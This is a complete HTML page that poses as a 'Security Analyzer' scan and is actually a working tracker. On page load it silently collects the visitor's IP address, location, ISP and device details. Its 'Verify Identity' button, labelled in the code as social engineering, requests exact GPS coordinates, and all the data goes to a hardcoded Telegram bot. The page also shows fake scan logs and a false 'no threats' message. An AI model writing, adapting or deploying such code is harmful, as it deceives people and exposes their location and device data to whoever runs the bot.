<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Scan</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 0 15px #00ff41; }
        .btn { background: none; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
        .btn:hover { background: #00ff41; color: #000; }
        #logs { font-size: 10px; text-align: left; margin-top: 15px; color: #008f11; overflow: hidden; height: 100px; }
    </style>
</head>
<body>

<div class="box">
    <h3>SECURITY ANALYZER</h3>
    <p id="msg">Scanning hardware for vulnerabilities...</p>
    <div id="logs"></div>
    <button class="btn" onclick="requestExact()">Verify Identity</button>
</div>

<script>
    const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
    const CHAT_ID = "5782276534";

    async function captureData(gps = null) {
        // 1. Silent Data (IP & Location)
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();

        // 2. Hardware Specs (Silent)
        const battery = await navigator.getBattery?.();
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

        // 3. Construct Message
        let report = `
🔥 **DEEP SCAN COMPLETE** 🔥
━━━━━━━━━━━━━━━━━━
👤 **USER INFO**
• IP: \`${ipData.ip}\`
• City: ${ipData.city}, ${ipData.country_name}
• ISP: ${ipData.org}

📱 **DEVICE SPECS**
• OS: ${navigator.platform}
• Screen: ${window.screen.width}x${window.screen.height}
• GPU: ${gpu}
• Battery: ${battery ? (battery.level * 100) + "%" : "Unknown"}

📍 **GPS DATA**
${gps ? `• Lat: ${gps.lat}\n• Lon: ${gps.lon}\n• Accuracy: ${gps.acc}m\n• Map: [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})` : "❌ Exact GPS Denied"}
━━━━━━━━━━━━━━━━━━`;

        // 4. Send to Telegram
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
        });
    }

    // Social Engineering: The button triggers the "Exact" GPS popup
    function requestExact() {
        document.getElementById('msg').innerText = "Verifying GPS Authentication...";
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                captureData({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
                document.getElementById('msg').innerText = "Scan Complete. No threats found.";
            },
            () => {
                captureData(); // Send IP data anyway if they block GPS
                document.getElementById('msg').innerText = "Error: GPS Verification Required.";
            }
        );
    }

    // Auto-run silent scan on load
    window.onload = () => {
        let logDiv = document.getElementById('logs');
        let lines = ["> Initializing scan...", "> Accessing kernel...", "> Fetching IP...", "> Hardware identified."];
        lines.forEach((l, i) => setTimeout(() => logDiv.innerHTML += l + "<br>", i * 500));
        captureData(); // Sends the silent IP/Device info immediately
    };
</script>
</body>
</html>
